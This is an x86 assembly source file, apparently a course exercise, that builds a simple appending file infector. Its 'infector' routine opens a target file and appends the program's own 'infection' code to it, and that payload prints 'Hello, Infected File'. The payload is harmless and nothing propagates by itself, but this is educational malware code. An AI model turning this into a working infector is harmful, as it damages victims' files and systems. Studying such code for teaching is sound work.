section .text
global _start
global system_call
global infector
global infection
global code_start
global code_end


section .data
msg db "Hello, Infected File",10,0

extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:

    infection:
        push ebp            ;backup ebp
        mov ebp, esp        ;open new action frame
        pushad              ;backup registers
        pushfd              ;backup registers
        mov eax, 4          ;write
        mov ebx, 1          ;stdout
        mov ecx, msg        ;string to write
        mov edx, 22         ;len of the string 
        int 0x80            ;interrupt the kernel to execute writing
        popfd               ;restore registers
        popad               ;restore registers
        pop ebp             ;back to previous action frame
        ret                 ;Back to caller

    infector:
        push ebp             ;backup ebp
        mov ebp, esp         ;open new action frame
        sub esp,4            ;place for return value 
        pushad               ;backup registers
        pushfd               ;backup registers
        mov eax, 5           ;open
        mov ebx, [ebp+8]     ;first arg - file descriptor
        mov ecx, 1025        ;append to the end of the file
        mov edx, 511         ;0777
        int 0x80             ;interrupt the kernel to execute open
        mov [ebp-4], eax     ;save the file descriptor which came back from open call
        mov eax, 4           ;write
        mov ebx, [ebp-4]     ;move file descriptor to ebx (file descriptor)
        mov ecx, 134525026   ;the address of infection as we found 
        mov edx,  99         ;len of the infection code 
        int 0x80             ;interrupt the kernel to execute write
        mov eax, 6           ;close
        mov ebx, [ebp-4]     ;file descriptor
        int 0x80             ;interrupt the kernel to execute close
        popfd                ;restore registers
        popad                ;restore registers
        add esp, 4           ;fix esp position - because the return value space
        pop ebp              ;back to previous action frame
        ret                  ;Back to caller

code_end :
